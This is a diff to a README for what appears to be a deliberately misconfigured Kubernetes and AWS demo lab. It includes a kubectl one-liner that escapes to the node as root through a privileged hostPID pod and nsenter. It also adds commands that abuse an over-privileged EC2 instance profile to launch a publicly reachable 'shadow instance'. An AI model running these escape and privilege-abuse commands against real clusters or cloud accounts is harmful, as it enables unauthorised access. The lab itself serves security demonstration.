@@ -95,17 +95,50 @@ Escape into the Node as **root** with kubectl
 ```
 ./kubectl run r00t --restart=Never -ti --rm --image tasky --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
 ```
-## SSH to Ext MongoDB
+## Public EC2 MongoDB - Verify ext SSH and RBAC
 Get the public IP of the EC2 instance running Mongo DB
 ```
 IP=$(terraform output -json | jq -r '.usw2_ec2_ip.value."usw2-shared-ext-mongodb"')
 ```
 
-SSH to the Ubuntu EC2 instance.  
+### Verify SSH is exposed externally  
 ```
 ssh ubuntu@${IP}
 ```
 This will use the AWS key that was defined in `my.auto.tfvars`
+
+### Verify the EC2 Profile has to many privileges (ec2:*)
+If an EC2 instance can assume this level of privilege it can easily provision new EC2 instances in any subnet, map it to any security group, and configure any SSH key pair.  Lets see how easy it is.
+
+EC2 key pair creation
+```
+ssh-keygen
+aws ec2 create-key-pair --key-name pp-keypair-test
+```
+
+EC2 Discovery
+
+Find a public subnet that is routable from the internet and a security group you want to apply to your shadow instance
+```
+aws ec2 describe-subnets --filters "Name=tag:Tier,Values=Public" | grep SubnetId
+aws ec2 describe-security-group-rules --query 'SecurityGroupRules[].[Description, SecurityGroupRuleId, ToPort, CidrIpv4]' --output table
+```
+
+EC2 Instance Creation
+```
+aws ec2 run-instances \
+  --image-id ami-07fe743f8d6d95a40 \
+  --instance-type t2.micro \
+  --subnet-id subnet-09d0a1ac53cbdab60 \
+  --security-group-ids sg-02c6b447d7387ae36 \
+  --associate-public-ip-address \
+  --key-name ppresto-ptfe-dev-key
+```
+
+Get the external IP to SSH to the new instance
+```
+aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId, InstanceType, SubnetId, PublicIpAddress]' --output table
+```
 
 ## Mongo DB Backups to S3
 Verify the backups are going to S3, they are public, and can be downloaded.  Start by going to the S3 URL in your browser.
